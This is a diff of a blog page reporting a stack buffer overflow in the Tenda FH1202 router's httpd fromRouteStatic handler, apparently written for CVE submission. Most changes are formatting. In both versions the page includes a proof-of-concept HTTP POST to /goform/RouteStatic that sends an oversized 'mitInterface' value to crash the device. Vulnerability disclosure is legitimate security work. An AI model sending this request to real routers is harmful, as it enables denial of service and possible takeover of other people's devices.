@@ -19,17 +19,17 @@
   <meta name="author" content="Jimi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="FH1202 VulnerabilityVendor:Tenda Product:FH1202 (download:https:&#x2F;&#x2F;www.tenda.com.cn&#x2F;download&#x2F;detail-2079.html) Vulnerability: buffer overflow DescriptionsWe found an overflow vulnerability in &lt;font">
+    <meta name="description" content="FH1202 VulnerabilityVendor:TendaProduct:FH1202 (download:https:&#x2F;&#x2F;www.tenda.com.cn&#x2F;download&#x2F;detail-2079.html)Vulnerability: buffer overflow DescriptionsWe found an overflow vulnerability in httpd :In f">
 <meta property="og:type" content="article">
 <meta property="og:title" content="cve3-FH1202-bufferoverflow">
 <meta property="og:url" content="https://jimi-lab.github.io/2026/02/15/cve3-FH1202-bufferoverflow/index.html">
 <meta property="og:site_name" content="Jimi&#39;s blog">
-<meta property="og:description" content="FH1202 VulnerabilityVendor:Tenda Product:FH1202 (download:https:&#x2F;&#x2F;www.tenda.com.cn&#x2F;download&#x2F;detail-2079.html) Vulnerability: buffer overflow DescriptionsWe found an overflow vulnerability in &lt;font">
+<meta property="og:description" content="FH1202 VulnerabilityVendor:TendaProduct:FH1202 (download:https:&#x2F;&#x2F;www.tenda.com.cn&#x2F;download&#x2F;detail-2079.html)Vulnerability: buffer overflow DescriptionsWe found an overflow vulnerability in httpd :In f">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://jimi-lab.github.io/img/cve3-FH1202-bufferoverflow.md/1.png">
 <meta property="og:image" content="https://jimi-lab.github.io/img/cve3-FH1202-bufferoverflow.md/2.png">
 <meta property="article:published_time" content="2026-02-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-02-15T02:21:34.003Z">
+<meta property="article:modified_time" content="2026-02-15T02:29:56.508Z">
 <meta property="article:author" content="Jimi">
 <meta property="article:tag" content="CVE提交">
 <meta property="article:tag" content="Buffer overflow">
@@ -231,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          146 字
+          85 字
         
       </span>
     
@@ -242,7 +242,7 @@
         
         
         
-          2 分钟
+          1 分钟
         
       </span>
     
@@ -284,18 +284,14 @@
             
               <div class="markdown-body">
                 
-                <h1 id="FH1202-Vulnerability"><a href="#FH1202-Vulnerability" class="headerlink" title="FH1202 Vulnerability"></a><font style="color:rgb(51, 51, 51);">FH1202 Vulnerability</font></h1><p><font style="color:rgb(51, 51, 51);">Vendor:Tenda</font></p>
-<p><font style="color:rgb(51, 51, 51);">Product:FH1202 (download:</font><a target="_blank" rel="noopener" href="https://www.tenda.com.cn/download/detail-2079.html">https://www.tenda.com.cn/download/detail-2079.html</a><font style="color:rgb(51, 51, 51);">)</font></p>
-<p><font style="color:rgb(51, 51, 51);">Vulnerability: buffer overflow</font></p>
-<h2 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a><font style="color:rgb(51, 51, 51);">Descriptions</font></h2><p><font style="color:rgb(51, 51, 51);">We found an overflow vulnerability in </font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;httpd&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> :</font></p>
-<p><font style="color:rgb(51, 51, 51);">In fromRouteStatic function,it reads in a user-provided parameter </font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;entrys&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">and </font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;mitInterface&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">.</font></p>
-<p><font style="color:rgb(51, 51, 51);">If the value of entrys is not empty , the variable v2 will be passed to the sprintf function without any length check, which may overflow the stack-based buffer s__1. </font></p>
+                <h1 id="FH1202-Vulnerability"><a href="#FH1202-Vulnerability" class="headerlink" title="FH1202 Vulnerability"></a>FH1202 Vulnerability</h1><p>Vendor:Tenda<br>Product:FH1202 (download:<a target="_blank" rel="noopener" href="https://www.tenda.com.cn/download/detail-2079.html">https://www.tenda.com.cn/download/detail-2079.html</a>)<br>Vulnerability: buffer overflow</p>
+<h1 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h1><p>We found an overflow vulnerability in httpd :<br>In fromRouteStatic function,it reads in a user-provided parameter entrysand mitInterface.<br>If the value of entrys is not empty , the variable v2 will be passed to the sprintf function without any length check, which may overflow the stack-based buffer s__1. </p>
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/../img/cve3-FH1202-bufferoverflow.md/1.png"></p>
-<p><font style="color:rgb(51, 51, 51);">As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.</font></p>
-<h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a><font style="color:rgb(51, 51, 51);">Proof of Concept (PoC)</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /goform/RouteStatic HTTP/1.1<br>Host: 192.168.6.2<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: en-US,en;q=0.9<br>Accept: text/plain, */*; q=0.01<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36<br>Referer: http://192.168.6.2/index.asp<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 1085<br><br>mitInterface=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure>
+<p>As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.</p>
+<h1 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /goform/RouteStatic HTTP/1.1<br>Host: 192.168.6.2<br>X-Requested-With: XMLHttpRequest<br>Accept-Language: en-US,en;q=0.9<br>Accept: text/plain, */*; q=0.01<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36<br>Referer: http://192.168.6.2/index.asp<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 1085<br><br>mitInterface=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure>
 
-<h2 id="Overcome"><a href="#Overcome" class="headerlink" title="Overcome"></a><font style="color:rgb(51, 51, 51);">Overcome</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<h1 id="Overcome"><a href="#Overcome" class="headerlink" title="Overcome"></a>Overcome</h1><!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/../img/cve3-FH1202-bufferoverflow.md/2.png"></p>
 
                 
@@ -389,9 +385,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/02/15/cve-FH1202-bufferoverflow/" title="cve-FH1202-bufferoverflow">
+                      <a href="/2026/02/15/cve2-FH1202-bufferoverflow/" title="cve2-FH1202-bufferoverflow">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">cve-FH1202-bufferoverflow</span>
+                        <span class="hidden-mobile">cve2-FH1202-bufferoverflow</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -399,8 +395,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/02/15/cve2-FH1202-bufferoverflow/" title="cve2-FH1202-bufferoverflow">
-                        <span class="hidden-mobile">cve2-FH1202-bufferoverflow</span>
+                      <a href="/2026/01/12/agent_skills_deep_dive/" title="Anthropic Agent Skills">
+                        <span class="hidden-mobile">Anthropic Agent Skills</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
